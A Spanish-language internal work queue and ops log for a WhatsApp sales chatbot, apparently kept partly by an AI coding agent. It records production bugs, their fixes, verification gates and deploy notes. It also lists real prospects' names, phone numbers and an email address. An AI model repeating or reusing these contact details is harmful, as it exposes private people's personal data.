# La cola — carril `chatbot`

> **Por qué existe este archivo.** El carril chatbot era el único sin cola: tenía
> `hermes-content/docs/handoff/chatbot.md`, que es **estado**, no plan. Y sin cola no puede
> tener loop — un loop sin cola no tiene qué comer, así que el carril sólo avanza cuando
> alguien abre su sesión a mano.
>
> Su plan SÍ existía: estaba enterrado dentro del handoff como backlogs sucesivos (v2, v3, v4,
> v5, v6, v6.5, v6.6, v6.7). Esto lo saca a la superficie. Doctrina y formato:
> `hermes-content/docs/cola/README.md`.

**Extraído del handoff el 2026-08-31, con Gate 1 corrido ítem por ítem.** De 15 pendientes
heredados, **7 eran fantasma** (46%): ya estaban hechos y el handoff los seguía arrastrando.
Están abajo en "Cerrado", cada uno con el archivo y la línea que lo prueba.

---

**Auditoría del 2026-09-01 — qué se midió EN VIVO y qué cambió.** Se verificó cada pendiente
contra producción (SSH al VPS, las dos bases, el motor corrido de verdad), no contra el papel.

| | |
|---|---|
| **Lo más caro que nadie había medido** | El bot **contesta una sola vez y se calla para siempre** en modo venta. Se veía en la conversación de HOY. Ítem 1 |
| **Ya estaba resuelto — no entró** | La **alarma del watchdog**. Estaba anotado que 2.874 reinicios fallidos pasaron sin avisar a nadie y que faltaba construir el aviso. Los reinicios son reales (720/día del 25 al 27-ago), pero el watchdog **ya fue reescrito el 28-ago** con aviso a Telegram por incidente y por recuperación, marcador para no repetir, y las credenciales cargadas. Corre cada 2 min y hoy está sano. Escribirlo habría sido trabajo fantasma |
| **Un bloqueo VENCIDO** | El de los fines de línea del espejo pedía una decisión de Sergio que ya no existe. Pasó de "Después/bloqueado" a "Ahora/ítem 4" |
| **Una instrucción que EMPEORABA producción** | Encender `ONIA_N8N_ENABLED` "es una línea" era falso: sin URL el envío falla en silencio. Reescrito en el ítem 2 |
| **El gate estaba en rojo y nadie lo sabía** | `$ node scripts/verificar_cola.js hermes-content/docs/cola/chatbot.md` salía **exit 1** desde que se escribieron los ítems del canario. Dos de las tres causas eran el gate gritando en falso (URLs y bloques de código); están arregladas en el script, con sus casos de self-check |
| **Podado** | El ítem de campañas tenía **nueve** vueltas encimadas (~210 líneas) y la fila S8 arrastraba seis. La historia vive en el `git log` |

---

## ✅ T4 — CERRADO el 2026-09-10 23:00: el acuse del handoff se repetia en CADA mensaje

**Deployado y probado en prod** (backup deploy-20260910T225929Z): conversacion QA en
`handoff_humano`, turno 1 acusa (1 mensaje), turno 2 → `silencio:handoff_en_curso`, 0
mensajes — el candado por fin PERSISTE entre turnos. Test nuevo en
`hermes-content/deploy/vps-ops/bot/persistence.test.mjs` fija la CLASE (las tres listas
hermanas del raw no pueden volver a desincronizarse). Diagnostico original:

Sergio Urcullo le escribió al bot de ventas (conv 11) en etapa `handoff_humano` y recibió
**tres veces seguidas** el mismo "Te leo, y esto también se lo paso a Sergio…" (msgs 890, 892,
894 — traza `respondio etapa=handoff_humano->handoff_humano` las tres). El acuse está diseñado
para salir UNA vez (`handoffAckAt`, bot-engine.mjs) y después silencio.

**Causa raíz, leída en el código:** `saveConversation` (persistence.mjs:384-391) arma el `raw`
con una lista propia — `qualifyAsks, outboundSeq, scheduledLabel, publicContact, inboxId` — y
**nunca escribe `handoffAckAt` ni `branchAsked`**. `toConversationRow` (bot-engine) sí los
incluye, pero el que corre en producción es `saveConversation`. El motor los setea, la base
nunca los recibe, el turno siguiente los carga en `null` (`stateFromRow` sí los lee) → acusa de
nuevo. `branchAsked` tiene el mismo agujero DOBLE: `saveConversation` no lo guarda y
`stateFromRow` tampoco lo restaura — la pregunta extra del rubro se repetiría igual.

**FIX:** agregar los dos campos al `raw` de `saveConversation` + `branchAsked` a `stateFromRow`
+ test de ida-y-vuelta (estado → fila → estado conserva `handoffAckAt`/`branchAsked`) + deploy
por `deploy-bot.sh`. **LISTO =** en conv real en handoff, segundo mensaje del prospecto produce
SILENCIO (traza `silencio:handoff_en_curso`), mirado en el log.

## ✅ CERRADO 10-sep — el motor enmudecía en conversaciones viejas (lo probó Sergio Urcullo en carne)

Sergio Urcullo mandó "hola" al +591 75414930 y el bot NO contestó. La traza exacta
(`/tmp/onia-bot-webhook.log` en `onia-center`):

```
19:28:50 conv=11 msg=873 rama=MUDO etapa=esperando_calificacion→esperando_calificacion
enviados=0/0 motivo=el motor no produjo respuesta entrada="hola"
```

La cadena Meta→Chatwoot→bot funcionó ENTERA (el mensaje llegó y el turno corrió). El bug
es del MOTOR: su número tenía una conversación vieja (pruebas del 15-ago) estancada en
`esperando_calificacion`, y en ese estado un "hola" produce cero salida en vez de retomar
o reiniciar el guion. El contraste que lo prueba: el mismo día 18:14, conversación NUEVA
por el widget (conv=49, etapa `nuevo`) con "Hola, quiero información" → `respondio` 1/1.
**Probable causa de los 3 silencios de agosto también.**

FIX (motor `bot-engine.mjs`, repo onia-hermes, deploy `/opt/onia/bot`): ningún estado
puede producir 0 mensajes ante un entrante real — conversación inactiva >N días se
reinicia al guion desde el saludo, o el estado re-pregunta lo que esperaba. Test que fija:
turno "hola" en cada etapa del guion con conversación vieja → SIEMPRE ≥1 mensaje de salida.
LISTO = Sergio Urcullo manda "hola" desde su teléfono y el bot le contesta (su conv es la 11
del inbox 5 — sirve de caso de prueba real).

✅ **CERRADO el 2026-09-10 con el caso real.** Traza de producción: 20:11:45 UTC el "Hola"
de Sergio Urcullo (msg 878) → `rama=respondio`, `esperando_calificacion→esperando_horario`,
1/1 enviado; 20:12:09 su "A" (msg 880) → `esperando_horario→demo_agendada` + aviso a
Telegram. El mismo mensaje que a las 19:28 daba `rama=MUDO` ahora recorre el guion entero.

**FIX DEPLOYADO el 2026-09-10 (~19:54 UTC):**

- **La causa NO era la rama `esperando_calificacion`** (esa ya migraba a la bienvenida desde
  antes): medido en la base, `chatwoot:11` tenía `human_took_over = t` desde el **13-ago** —
  la Barrera 1 ("humano a cargo = silencio para siempre") se comía el "hola". La traza decía
  "el motor no produjo respuesta" porque los `notes` del motor nunca llegan al campo que la
  traza lee (lee `warnings`); el motor sí anotaba `silencio:humano_a_cargo`.
- **Fix**: Barrera 0 nueva en `step()` — entrante real de un contacto en conversación donde
  NUESTRO lado (bot o humano) no habla hace >14 días (`config.reinicio.trasDiasSinActividad`)
  → se reinicia al guion desde el saludo (limpia `humanTookOver`, `handoffAckAt`, contadores
  y agenda; conserva calificación). El **opt-out nunca vence** (solo DEMO reabre, M6). Un
  traspaso humano entra como `author: "human"`: jamás dispara la bienvenida encima del humano
  y refresca `lastOutboundAt` (charla humana viva no cuenta como muerta).
- **Trampa que salió al probar**: el reloj NO puede mirar `lastInboundAt` — el propio "hola"
  mudo del 10-sep la había actualizado, así que cada intento del prospecto rearmaba los 14
  días y el bot no revivía jamás. El reloj mide `lastOutboundAt`/`humanTookOverAt`.
- **Probado en producción** con un clon exacto del estado de conv 11
  (`sim:qa-reinicio-vencida`, borrado después): `stageBefore esperando_calificacion` →
  `esperando_horario`, 1 mensaje M0, `notes: [reinicio:conversacion_vencida, bienvenida]`,
  `humanTookOver: false`. Conv 11 real quedó INTACTA a propósito: es el caso de prueba.
- Gate del deploy: 893/893 tests verdes en el VPS. Backup: `/opt/onia/bot/backups/deploy-20260910T195349Z`.
  Commits `55e669a6` + `22546797` (rama `claude/cobro-e2e-punto-1-25ba65`). Tarea en el
  tablero pidiéndole a Sergio Urcullo el "hola" de cierre.

## 🔴 Cal.com NO EXISTE — las demos del bot no entran a ningún calendario (medido 11-sep)

Pregunta directa de Sergio Urcullo ("¿está funcionando el cal de onia?"). Medido en vivo:
**cero contenedores de Cal.com en el VPS** (`docker ps` completo, ninguno), cal.onia.com.bo
redirige a onia.com.bo/empezar, y el env del bot no tiene `CALCOM_BASE_URL` — por eso
`createBooking` (`hermes-content/deploy/vps-ops/bot/calcom-booking.mjs`) devuelve
`sin_config` SIEMPRE y la demo de prueba del 10-sep quedó con `calendar_event_id` VACÍO.

**Lo que SÍ funciona (flujo degradado honesto, por diseño):** el bot ofrece los horarios de
`ONIA_BOT_SLOTS` (los renueva el cron python diario, independiente de Cal), el prospecto
elige, la fila queda en la base, el aviso de `demo_agendada` LLEGA al Telegram de Sergio
Urcullo, y el texto agrega "(Estoy confirmando ese horario con Sergio…)". Lo que NO pasa:
evento en calendario ni link de videollamada (M2_LINK solo sale con booking ok — diseñado).

**Decisión de Sergio Urcullo (opciones cotizadas):**
(a) redesplegar Cal.com self-hosted (investigar por qué desapareció el contenedor);
(b) cuenta Cal.com cloud gratis + adaptar `calcom-booking.mjs` a su API;
(c) seguir sin calendario mientras el volumen sea ~1 demo/semana — el aviso por Telegram +
confirmación por WhatsApp alcanza y el bot ya es honesto. Recomendada HOY: (c), y (a/b)
cuando haya volumen real.

## Objetivo único

**Que un desconocido escriba y esa conversación se vea en la bandeja.**

**Hecho =** se abre `/inbox` con la sesión del dueño y hay una conversación de una persona
que no somos nosotros — ni una org QA, ni el probador, ni Sergio desde su celular.

**Por qué éste y no otro.** El producto está construido: bandeja nativa, editor conversacional,
multimedia, visión, comprobantes, insistencia, campañas, push. Trece piezas en tres días. Lo
que NO existe es la única prueba de que sirve: alguien de afuera usándolo. Un objetivo que
fuera "cerrar v6.8" o "difusiones masivas" agregaría la pieza catorce a un producto que
todavía no atendió a nadie.

**El estado de arranque, medido hoy:** el enlace de WhatsApp de onia.com.bo YA manda
desconocidos al +591 75414930, que está en Cloud API con el bot atendiendo
(`web-factory/apps/onia-platform/src/lib/site.ts:30-49`). O sea que la distribución existe
hace semanas. Lo que falta es la última cuadra: que esa conversación **aparezca en la
bandeja**, y que la respuesta sea la que corresponde a lo que la persona clickeó.

🎯 **La MITAD cumplida el 2026-08-31.** Sergio vinculó `Onia (interna)` al inbox 5 y la
pantalla se MIRÓ en producción con la sesión de esa org: `/inbox` lista a **mariohassen**
(+591 73021804, 27-ago) y a **F** (+591 73232758, 25-ago, la clínica odontológica de 4
doctores). Ninguno de los dos es QA, ni el probador, ni Sergio. La prueba está en el ítem 1
de "Cerrado". Contestarles es **S7**, y vende Sergio.

✅ **La otra mitad se cerró el 2026-09-04: el inbox 4 ya cuelga de la org.** Durante días el
widget de la web (inbox 4) no tuvo dueño, así que sus desconocidos no se podían abrir desde el
producto. Hoy se aplicó `scripts/migrar_inboxes_onia.mjs --aplicar --deploy-hecho b5e23d4`,
después de comprobar que el código que lee las **dos** columnas ya corre en producción (BUILD_ID
`mIi3zy_CtrcMhV8tRV2LF` = `/opt/onia-platform/build-b5e23d4`). El orden importa en un solo
sentido, y por eso el script se niega a correr sin ese sha.

| `Onia (interna)` | antes | ahora |
|---|---|---|
| `chatwootInboxId` (web) | 5 | **4** |
| `chatwootWhatsappInboxId` | NULL | **5** |

Respaldo previo: `/root/backups-chatbot/clinic_settings-20260904-0806.csv`. `ZZ QA Clinica
Chatbot` sigue en 7, intacta.

**La prueba no es un `grep`:** `npm run inbox:tenencia` pasó de ROJO a **exit 0** — *"TENENCIA OK
— `Onia (interna)` tiene el 4 (web) y el 5 (WhatsApp), sin colisiones"*. Lo que destrabó, contado
en Chatwoot: inbox 4 con **cinco desconocidos reales** (convs 34, 36, 38, 40, 48) e inbox 5 con
**F** (35, la clínica de 4 doctores) y **mariohassen** (37) — los dos grupos bajo la misma org.

⚠️ **Falta la captura, y es lo único que falta.** `/inbox` renderizado no se pudo mirar: la única
cuenta de `Onia (interna)` es `superadmin@onia.com.bo` (medido en `public.profiles`) y su clave no
está en ningún env del VPS. **No se rotó a propósito** — es la cuenta admin de Sergio en
producción. Se destraba con esa clave, o con el OK para dar de alta un ADMIN de QA en esa org
(da vista a leads reales, por eso no se hizo solo). Detalle en la tarea `t_6f5b8f52`.

🔴 **Y apareció algo peor que la visibilidad, que nadie había medido: el bot contesta UNA vez
y se calla para siempre.** En modo venta —el de los inboxes 4 y 5, que es por donde entra todo
desconocido— **ninguna conversación recibió jamás una segunda respuesta**. Sin los dos horarios
de demo definidos, el bot deriva a un humano en el primer mensaje y después calla a propósito;
el aviso que debía traer a ese humano tampoco sale. O sea que **hoy la bandeja llena no
alcanzaría**: la persona que escribe queda esperando igual. Ítems 1 y 2 de "Ahora".

**Redefinición honesta del "hecho", 2026-09-01.** Que la conversación se VEA era la mitad
correcta del objetivo, pero es insuficiente sola. El objetivo se cumple cuando **un desconocido
escribe dos veces, el bot le contesta las dos, y esa conversación se abre en `/inbox`**.

⚠️ **Recontado el 2026-09-02 contra la base de HOY, no contra este párrafo: en inbox 4 ya no
son tres, son SEIS — y crecen sin que nadie las vea.** `docker exec` a `onia-chatbot-db`
(conversaciones × mensajes de `inbox_id=4`): 34 (24-ago, "hola", sin contacto), 36 (27-ago,
`Saguilera@ds-santacruz.bo`, ya en S7), 38 (29-ago, "hola", sin contacto), 40 (29-ago, sin
contacto), **45 (01-sep, "tengo una ferreteria", sin contacto)** y **46 (01-sep, "Hola,
quiero informacion... Tengo una clinica dental en Santa Cruz, somos 4 personas", sin
contacto)** — estas dos últimas no estaban contadas en ningún lado. De las seis, **cinco no
dejaron teléfono ni correo**: sólo se les puede contestar DESDE el widget, que es exactamente
lo que el inbox huérfano impide. La decisión §9 sigue en pie (opción 1, dejar el 4 sin dueño
"hasta que la limitación moleste") pero el propio dato que le faltaba a esa condición ya
está: **S14** en Bloqueado.

---

## Cómo se trabaja esta cola

Igual que las otras cuatro — el detalle está en `hermes-content/docs/cola/README.md`. El
resumen: un ítem por vuelta, Gate 1 antes de tocar nada (¿ya está hecho? verificar EN VIVO,
un grep sirve para descartar y nunca para confirmar), gates completos donde haya código
(`tsc --noEmit` + tests + `eslint`, los tres), y si toca pantalla **se abre y se MIRA**.

**Nada entra a "Ahora" sin evidencia de que existe**, y se verifica solo:

```bash
node scripts/verificar_cola.js hermes-content/docs/cola/chatbot.md
```

**Y nada se declara "listo para desplegar" sin que el deploy lo alcance:**

```bash
npm run deploy:alcanzable
```

Saca los commits de `onia-platform` que esta cola nombra y le pregunta a git si `origin/master`
—la rama de la que se buildea— los alcanza. Nace de que la misma fila (**S11**) falló tres veces:
el commit no existía, después existía sin estar mergeado. **Un párrafo que lista commits
envejece; esto no.** Hoy sale **0**: los 4 commits declarados llegan a `origin/master`. Fue el
gate el que destapó que **S16 había vencido** — ver el primer ítem de "Cerrado".

**Y ningún bloqueo le pide a Sergio algo que ya está resuelto:**

```bash
npm run bloqueos:vencidos
```

Corre el verificador que cada fila de "Bloqueado en Sergio" declara con la marca
`**Verificador:** \`<comando>\` → <código>`, y sale **1** nombrando las que ya están
satisfechas. Nace de que S16 declaraba el suyo y **ninguna vuelta lo corría**: venció en
silencio y se destapó de casualidad, ya vencido, adentro de una auditoría de los `[x]`.
Sólo ejecuta `npm run <script de package.json>` o `node <ruta del repo>`, siempre sin shell:
un gate que corre texto arbitrario sacado de un documento es peor que el problema que tapa.
Hoy sale **0** — S9 y S10 medidos vivos, los dos siguen bloqueados.

**Y la bandeja del objetivo no se da vuelta sola sin que nadie se entere:**

```bash
npm run inbox:tenencia
```

Le pregunta a la base de producción quién es dueño de cada inbox de Chatwoot. Sale **0** si
`Onia (interna)` tiene el inbox 5 —la tenencia que S8 dejó cerrada, y la única columna que
decide qué muestra `/inbox`— y **1** si se movió o si dos orgs reclaman el mismo inbox. Nace de
que **ya se dio vuelta una vez**, a las 02:02 del 1-sep, por un mecanismo que sigue sin
identificarse: la fila se borró y se re-creó por fuera de la app apuntando al inbox 4, y con eso
**S7 quedó roto sin que la cola lo supiera**. El ítem que lo arregló se cerró dejando escrito su
propio comando de verificación —y a nadie que lo corriera—, que es el molde con el que S16
venció en silencio. Hoy sale **0**.

**Y el objetivo del carril se comprueba solo, entero y por HTTP:**

```bash
npm run objetivo:visible
```

Genera una sesión del dueño real de la bandeja (preguntado a la base, no hardcodeado), llama a
`/api/bandeja` contra el host público y sale **0** si ahí hay alguien que no somos nosotros.
Es el ÚNICO gate que mide el objetivo y no una pieza suya: `inbox:tenencia` mide la columna, que
es el primer eslabón de cinco, y **los otros cuatro fallan devolviendo 200 con la lista vacía**.
Hoy sale **0** — mariohassen y F, por el camino completo.

**Nunca:** desplegar al VPS sin OK de Sergio · tocar otro carril (web-factory es dueño de
`web-factory/`, producto de la cola de plataforma) · gastar plata · bajar una superficie viva.

---

## Ahora

- [x] ✅ **CERRADO el 2026-09-11 (`93256eab`, onia-hermes — pusheado a la rama, falta mergear):
      el intake de leads le afirmaba a Sergio Urcullo que TODO contacto había pedido una demo.**
      Tablero `t_62aa450c`, encontrado por otro carril midiendo en vivo.

      `web-factory/apps/site/src/app/api/onia-center/leads/intake/route.ts` clavaba
      `nextAction: "Confirmar demo"` y `meetingStatus: "solicitada"` para todo lead, sin mirar de
      dónde venía. El endpoint se escribió para un agenda-form que **sí** pedía reunión; hoy su
      **único llamador vivo** es `/guia-facturacion` —el imán de leads del SIN, que entrega una
      hoja imprimible y no ofrece ninguna reunión—, así que el defecto alcanza al **100 %** de
      los leads que entran por ahí, no a una minoría.

      **No es cosmético: `"solicitada"` es lo que el panel LEE para decir que alguien pidió
      reunión.** Medido sobre los consumidores: el contador de reuniones y su lista en
      `web-factory/apps/site/src/app/onia-center/equipo/page.tsx` (líneas 254 y 559) y el filtro
      de la vista de hoy en
      `web-factory/apps/site/src/app/onia-center/next/hoy/page.tsx` (línea 118).
      Cada descarga de la hoja aterrizaba en la vista diaria de Sergio Urcullo como
      una demo pedida, revuelta con las que sí lo son — el pipeline donde tiene que elegir a
      quién le escribe.

      **LA CLASE, para buscarla en otro lado:** un endpoint reusado para un segundo caso de uso
      conserva las AFIRMACIONES del primero, y ninguna de ellas es mentira *en el caso para el
      que se escribió*. Ningún gate podía verlo — el lead se guarda bien, la ruta responde, no
      sobra ni falta una palabra, no es un rubro ni un plan ni un rol. Lo que estaba mal es el
      par (de dónde vino, qué se afirma que pidió). Y lo escondía el hermano sano: el alta
      manual del panel (`NewLeadForm.tsx:87`) ya escribía `"pendiente"`, que es exactamente lo
      correcto; mirar ese camino confirmaba en falso que el tema estaba cubierto.

      Arreglo: la decisión sale a `web-factory/apps/site/src/lib/intencion-del-lead.mjs`. **Se
      enumera la EXCUSA (`pidioDemo: true`), no los orígenes que no son demo** — una lista de
      orígenes falla ABIERTA el día que nace un imán de leads nuevo, y falla en la dirección
      cara (contamina el pipeline y nada se pone en rojo). `"pendiente"` y no `undefined` a
      propósito, para quedar igual que el alta manual. `=== true` y no truthy: el body llega de
      la red y un `"false"` de texto no puede valer por un pedido de reunión.

      El módulo va en `.mjs` y no en `.ts` **a propósito**: el integrador corre la cadena
      `npm test` también desde el VPS, que tiene Node 20 — un `import` de `.ts` la pondría roja
      ahí y eso traba el merge de todos los carriles. Verificado en las dos direcciones que
      `tsc` resuelve y **tipa** el import por el alias `@/` (control negativo: pedirle
      `"cancelada"` da `TS2322`, o sea que no está pasando como `any`).

      Gate `intencion-del-lead.test.mjs` (`npm run test:intencion-lead`, cableado a la cadena),
      en **dos mitades porque ninguna ve lo de la otra**: comportamiento (lo que la función
      DEVUELVE) y cableado (que el route lo USE, anclando la **asignación** — el esquive barato
      es llamarlo y tirar el resultado). **Validado por mutación en seis direcciones**, las seis
      en rojo, y las del módulo cayendo cada una en SU caso: revertir el arreglo, el esquive, la
      media cura (`nextAction` derivado y `meetingStatus` clavado), el default que vuelve a
      afirmar la reunión, `truthy` en vez de `=== true`, y el rubro sin `trim`. El código se
      mide con los **comentarios en blanco**: si no, esta misma bitácora —que cita
      `"solicitada"` para explicar el defecto— absuelve al gate.

      Medido contra el sistema correcto, no heredado: `docker exec onia-landing env` muestra
      que `ONIA_CENTER_INTAKE_URL` apunta al contenedor `onia-center` en el puerto 3012, a la
      ruta del intake — o sea, a este archivo y no a otra copia.
      ⚠️ **Commiteado, NO desplegado, y por un camino que no es el de siempre:**
      `onia-center` tiene runbook y scripts (`hermes-content/deploy/onia-center/`) pero **no es
      uno de los tres destinos que ejecuta el `ok <id>` de Sergio Urcullo** (landing, plataforma,
      bot), así que ningún pedido de deploy lo cubre y el contenedor —`node:20-alpine`, arriba
      hace 5 días— sigue sirviendo la versión vieja hasta que alguien lo reconstruya a mano.
      `web-factory/apps/site` tampoco tiene `node_modules` acá ni CI que lo buildee.

- [x] ✅ **CERRADO el 2026-09-11 (`9b9cde4`, onia-platform — pusheado a la rama, falta mergear y
      desplegar): el add-on vigente no decía hasta cuándo, y no dejaba renovar antes del corte.**

      Ayer el add-on ganó vigencia de verdad (`5011003`) y ese mismo día empezó a avisar
      D-7/D-3/D-1/vencido por correo, in-app y push, con el botón apuntando a
      `/settings/addon-chatbot`. **Esa pantalla quedó como estaba.**

      Medido sobre `AddonChatbotClient.tsx`: sus tres ramas eran excluyentes y el formulario de
      comprobante vivía en la última, la de contratar. Mientras el add-on sigue **vigente** —que
      es justo cuando el aviso llega— `isWhatsAppAddonActive` da `true`, la pantalla cae en la
      rama ACTIVO, y esa rama **no tiene la fecha y no tiene dónde pagar**. El dueño que recibe
      *«tu asistente deja de contestar el 14»* abre el link, lee **«Add-on activo · Activado el
      25 de agosto»** —la fecha de ALTA, que se lee como permanente— y no encuentra ni cuándo
      vence ni cómo renovar. El único camino para pagar era esperar a que se **apague**: perder
      el servicio primero, con sus clientes escribiéndole a un bot mudo.

      **LA CLASE, para buscarla en otro lado:** cuando un concepto gana una dimensión, los
      AVISOS la adoptan primero —sin ella no se pueden redactar— y la pantalla que lo
      **administra** se queda sin ella, siendo adonde los avisos mandan. Es la firma conocida
      «cerrar una mitad rompe a la otra» aplicada a una pantalla: el arreglo convirtió una rama
      terminal en una rama transitoria y nadie volvió a mirar la rama.

      Ningún gate podía verlo: no sobra ni falta una palabra, el monto sale de la fuente única,
      el rubro deriva bien, el rol filtra bien (`SOLO_ADMIN`), la ruta existe y responde, y
      `addon-vigencia.ts` y el cron están verdes **con razón** — cada uno tiene razón por
      separado. El defecto vive en el par (estado del add-on, lo que la pantalla deja hacer).

      Arreglo: la decisión sale a `lib/subscription/addon-en-pantalla.ts` (un `page.tsx` no puede
      exportar helpers, y como ternario anidado en el TSX lo único medible es el texto del
      archivo, que se absuelve solo). La fecha se deriva con `vencimientoDelAddon` —la MISMA
      función que redacta el aviso, no una prima—, así que el correo y la pantalla a la que ese
      correo manda no pueden decir fechas distintas. Sin vigencia (otorgado a mano) no se inventa
      fecha ni se ofrece renovar, que sería cobrar dos veces lo mismo. Y un comprobante en
      revisión tapa al pago **también** con el add-on activo: si no, el que ya pagó su renovación
      no ve acuse de nada y vuelve a pagar.

      Gate `lib/subscription/addon-en-pantalla.test.ts`, validado por mutación en **cinco**
      direcciones y cada una cae en SU caso: el activo sin camino de pago (el defecto original),
      la revisión que deja de tapar, el esquive en `page.tsx` (llamar al helper y tirar el
      resultado), el esquive en el cliente (decidir con un ternario propio) y recibir la fecha
      sin pintarla. El prop va **requerido**: opcional con default es el hueco que `tsc` no ve.
      **Mirado renderizado** con el CSS del build vivo (`/root/addon-pantalla.png`): dice «Activo
      hasta el 25 de septiembre de 2026» y abre «Renovación» con su formulario.
      Gates: `tsc` 0 · **4599** tests · `eslint` 0 errores.

- [x] ✅ **CERRADO el 2026-09-11 (`278f030`, onia-platform — falta mergear y desplegar): el cron
      de recordatorios le escribía a los pacientes en nombre de una cuenta vencida.**

      **La CUARTA puerta que escribe sin sesión del dueño**, y la encontré preguntando por la
      hermana del arreglo de ayer. Las otras tres ya preguntan si la cuenta sigue viva: el panel
      corta sus 35 rutas con `checkPlanExpiry`, la reserva pública se cerró el 08-sep
      (`lib/agenda/reserva-publica.ts`) y el bot de WhatsApp ayer (`atiende-el-bot.ts`). Ésta no
      preguntaba nada.

      Medido sobre `app/api/cron/appointment-reminders/route.ts`: su `SELECT_CITA` traía `plan`
      —el plan **CONTRATADO**, no el estado— y ni `planEnd` ni `trialEnd`, y las dos `findMany`
      filtran sólo por fecha de la cita. Así que el negocio en solo lectura le seguía escribiendo
      a sus pacientes por correo **y por WhatsApp**, firmando con su nombre, y cada mensaje de
      WhatsApp gasta plata real de Meta.

      **Lo urgente no es el gasto: desde que el bot corta, este recordatorio CONTRADICE a su
      puerta hermana.** Le dice al paciente *«tu cita es mañana»*, lo invita a responder, y del
      otro lado ya no atiende nadie. La lección conocida es que cerrar media familia deja la otra
      mitad abierta; acá es peor y es nueva: **la mitad cerrada ROMPE a la abierta**.

      Ningún gate podía verlo — no sobra ni falta una palabra, el rubro deriva bien (ese eje se
      cerró el 07-sep), el vocabulario es el correcto y el camino feliz funciona. Falla **quién
      pregunta**.

      **Hoy no muerde de casualidad y muerde esta semana:** contadas en `supabase-db`, las citas
      futuras son 0, y las dos orgs reales (`bolivian-electricidad-e6t21`, `clinica-sergio-p2ljs`)
      están en trial y vencen el **14** y el **17-sep**. La segunda tiene `addon.whatsapp` activo.

      Arreglo: se pregunta con `isWriteBlocked` —el MISMO corte del panel y del bot, no una
      prima—, así la gracia del trial vale igual y a quien paga un día tarde no se le apagan los
      recordatorios que compró; un alta manual sin fechas sigue andando. El corte va **ANTES de
      `reclamarVentana`**, que es un CAS de un solo uso: puesto después quemaría la marca y el
      paciente se quedaría sin recordatorio también el día que el dueño renueve. Desenlace propio
      (`"cuenta-vencida"`) para que una corrida saltada no se lea como un día sin citas. Las
      fechas van **requeridas en el tipo**: `derivePlanStatus` lee un `undefined` como «sin fecha»
      y devuelve vigente, así que un llamador que no se las pida a Prisma haría que el corte no
      corte nunca, en silencio.

      Gate `app/api/cron/appointment-reminders/cuenta-viva.test.ts`, validado por mutación en
      **cuatro** direcciones y cada una cae en SU caso —ningún guardia tapa a otro—: sin corte
      (3 casos), **esquive** llamando y tirando el resultado (1), corte después del CAS (1), y
      `SELECT` sin las fechas (1). Gates verdes: `tsc` 0 · **4482** tests · `eslint` 0.

- [x] ✅ **CERRADO el 2026-09-11 (`e6adb19`, onia-platform): la recarga del chatbot CADUCA a fin
      de mes y ninguna de las tres superficies que la vende lo decía.** Bs 190 por 200
      conversaciones que se evaporan el día 1.

      No es copy: el producto lo aplica. `ChatbotUsoMensual.recargadas` es por
      `(organizationId, mes)` y `estadoCupo` lee la fila del mes en curso, así que el 1 vuelve
      a 0. Y el bloque de compra aparece **recién al 80 % del cupo**, que cae avanzado el mes:
      el dueño que cruza el umbral un 28 paga y tiene dos días para usar lo que compró.

      Las tres superficies mudas, medidas con el gate derivado del disco antes de tocar nada:
      `CupoConversacionesCard.tsx:70` (el botón), `lib/chatbot/cupo.ts:278` (el aviso del corte)
      y `lib/pricing.ts:202` (el mensaje de WhatsApp con el que el dueño la pide). Peor, el
      estado agotado remataba con *«si no hacés nada, se renueva el 1 del mes que viene»* al
      lado de *«podés sumar más»*: se lee como que lo comprado sobrevive a esa renovación.

      **Lo que lo delata, y es la firma para buscar más de esta clase:** el aviso que sale
      **después** de cobrar (`CHATBOT_RECARGA_APLICADA`) ya decía *«de este mes»*. La salvedad
      estaba escrita, pero donde no la lee quien decide. Ningún gate podía verla — no sobra una
      palabra prohibida, el precio sale de la fuente única, no es un rubro, ni un plan, ni un
      rol, y el camino de fallo del botón ya estaba cubierto. Es el escalón siguiente de
      `limite-que-corta.test.ts` (06-sep): ahí la venta callaba **cuánto te dan**; acá,
      **cuánto te dura**.

      Arreglo: no se borra la promesa, se condiciona (mismo patrón que `SEARXNG_URL` y el
      importe del QR). `RECARGA_CONVERSACIONES.vigencia` vive una sola vez en `pricing.ts` y la
      nombran las tres. Se quitó el párrafo que había agregado en la tarjeta: `textoDeCupo` ya
      lo dice ahí y duplicaba la advertencia en la misma pantalla.

      Gates: `lib/chatbot/recarga-dice-su-vigencia.test.ts` (mide lo que las funciones
      DEVUELVEN + deriva del disco las superficies que ofrecen sumar, para que una nueva nazca
      vigilada) y `CupoConversacionesCard.render.test.ts` (prueba que la pantalla lo PINTE —su
      caso propio, el que el otro no puede ver). **Validados por mutación en 7 direcciones**,
      incluido el esquive (salvedad lejos de la oferta) y un sujeto nuevo sin cubrir. Tres
      gates de `onia-platform` verdes: `tsc` 0, 4438 tests, `lint` 0 errores.

      ⚠️ **Commiteado y pusheado, NO desplegado**: el swap lo hace `onia-cola` cuando Sergio
      Urcullo aprueba el pedido de deploy de plataforma. Hasta entonces el dueño sigue viendo
      la versión muda.

      **Queda una decisión de plata, anotada y no tomada acá** (radar, §recarga): arrastrar lo
      no usado al mes siguiente. Hoy caduca; decirlo es honesto, pero la alternativa cambia lo
      que el cliente recibe por Bs 190.

- [x] ✅ **CERRADO el 2026-09-11 (`7a9e10c0`): el barrido de rescate intentó salvar un «hola»
      real CUATRO veces, falló las cuatro, y salió con `exit 0` — la misma cara que una vuelta
      sin trabajo. Nadie se enteró.**

      Medido en el log de producción, no heredado. Inbox 5 (Onia WhatsApp), conversación 11:

      ```
      messages id=873  message_type=0  2026-09-10 19:28:49Z  "hola"
      19:34  conv 11 msg 873 —  5 min sin respuesta -> mensaje_ya_procesado
      19:44  conv 11 msg 873 — 15 min sin respuesta -> sin_respuesta
      19:54  conv 11 msg 873 — 25 min sin respuesta -> sin_respuesta
      20:04  conv 11 msg 873 — 35 min sin respuesta -> sin_respuesta
      ```

      El bot **nunca** le contestó. Dejó de figurar como huérfano a las 20:11 y no porque lo
      rescataran: porque **la persona volvió a escribir sola**. Las cuatro vueltas cerraron con
      `0 CONTESTADOS`, y `armarAvisoRescate()` sólo mira `contestado`, así que tampoco salió un
      aviso. Un lead perdido, en silencio, con el instrumento que existe para verlo mirándolo.

      **La causa:** `runRescateSweep` tenía **tres** salidas y contabilizaba **dos**. `contestado`
      sumaba y avisaba; `respuesta_ilegible` y el error caían en `fallidos` (exit 1); y un cuerpo
      **legible** que dice *no emití nada* no caía en ninguna. El propio archivo ya había escrito
      la regla correcta para el hermano ilegible —*«no poder LEER el resultado no es 'no pasó
